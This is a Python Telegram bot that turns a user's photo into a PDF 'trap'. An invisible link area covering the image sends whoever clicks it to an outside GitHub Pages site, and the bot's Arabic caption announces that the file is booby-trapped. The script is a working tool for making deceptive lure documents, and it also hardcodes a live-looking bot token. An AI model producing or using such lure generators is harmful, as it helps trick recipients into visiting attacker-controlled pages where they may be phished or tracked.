import telebot
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
import requests
import os

TOKEN = "8595115985:AAEQInFhoQI-yUs3kmSIYjmuDPW65ufmO1o"
bot = telebot.TeleBot(TOKEN)
MY_LINK = "https://jeannettaleath-ship-it.github.io/MAX191/"

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "مرحباً بك. أرسل صورتك الآن لصنع ملف PDF بداخلها رابط الموقع.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    bot.reply_to(message, "⏳ جاري إنشاء ملف PDF تفاعلي...")
    
    # تحميل الصورة
    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    img_name = "temp_image.jpg"
    with open(img_name, "wb") as f:
        f.write(downloaded_file)

    # إنشاء ملف الـ PDF مع رابط على الصورة
    pdf_name = "trap_6969597735.pdf"
    c = canvas.Canvas(pdf_name, pagesize=A4)
    width, height = A4
    
    # رسم الصورة في منتصف الصفحة (تقريباً)
    img_w, img_h = 400, 400
    x = (width - img_w) / 2
    y = (height - img_h) / 2
    
    c.drawImage(img_name, x, y, width=img_w, height=img_h)
    
    # إضافة "منطقة نقر" شفافة فوق الصورة تماماً
    c.linkURL(MY_LINK, (x, y, x + img_w, y + img_h), relative=1)
    
    c.showPage()
    c.save()

    # إرسال الملف
    with open(pdf_name, "rb") as pdf:
        bot.send_document(message.chat.id, pdf, caption="📄 تم التلغيم! اضغط على الصورة داخل الملف لفتح الرابط.")

    # تنظيف
    os.remove(img_name)
    os.remove(pdf_name)

bot.polling()
